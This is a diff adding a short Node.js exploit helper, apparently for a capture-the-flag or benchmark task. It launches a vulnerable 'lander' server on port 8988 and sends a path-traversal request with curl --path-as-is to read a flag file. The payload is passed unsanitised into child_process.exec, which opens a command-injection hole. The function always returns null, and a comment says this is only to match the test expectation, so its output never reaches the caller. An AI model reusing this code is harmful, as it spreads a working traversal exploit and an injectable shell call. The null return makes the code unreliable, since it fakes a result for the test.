@@ -1,0 +1,26 @@
+function exploitFunction(payload) {
+    const path = require("path");
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+    const pkg = require("lander");
+    const fs = require("fs");
+    const { exec } = require("child_process");
+
+    try {
+        fs.readFileSync(pathToFlag).toString(); // This is safe for demonstration
+        pkg(8988); // This is the vulnerable part
+
+        let attack_string = `curl -v --path-as-is "http://127.0.0.1:8988${payload}"`;
+        exec(attack_string, (error, stdout) => {
+            if (stdout) {
+                return stdout;
+            }
+        });
+    } catch (e) {
+        console.error(e);
+    }
+
+    return null; // Return something to match the test expectation
+}
+
+module.exports = { exploitFunction };
